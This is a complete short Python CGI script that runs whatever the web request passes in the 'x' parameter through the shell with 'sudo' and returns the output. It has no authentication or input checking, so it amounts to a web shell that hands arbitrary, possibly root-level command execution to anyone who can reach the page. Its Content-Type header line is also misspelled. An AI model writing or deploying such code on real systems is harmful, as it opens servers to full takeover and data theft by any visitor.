#!/usr/bin/python3
import subprocess as sp
import cgi

print("Conten-type: text/html")
print()

cmd=cgi.FieldStorage()
mycmd=cmd.getvalue('x')
out=sp.getoutput("sudo " + mycmd)
print(out)
